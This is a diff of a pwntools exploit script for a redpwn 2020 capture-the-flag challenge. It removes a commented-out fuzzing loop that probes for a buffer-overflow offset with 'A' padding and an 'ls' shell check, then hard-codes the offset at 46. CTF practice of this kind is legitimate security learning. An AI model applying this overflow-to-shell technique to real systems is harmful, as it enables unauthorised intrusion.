@@ -3,15 +3,6 @@ from pwn import *
 context.log_level='critical'
 host,port="2020.redpwnc.tf",31199
 for x in range(100):
-#    s=remote(host,port)
-#    s.recvline()
-#    s.recvline()
-#    s.sendline("A"*x)
-#    try:
-#        s.sendline("ls")
-#        print(x)
-#    except:
-#        print("false")
     x=46
     s=remote(host,port)
     s.recvline()
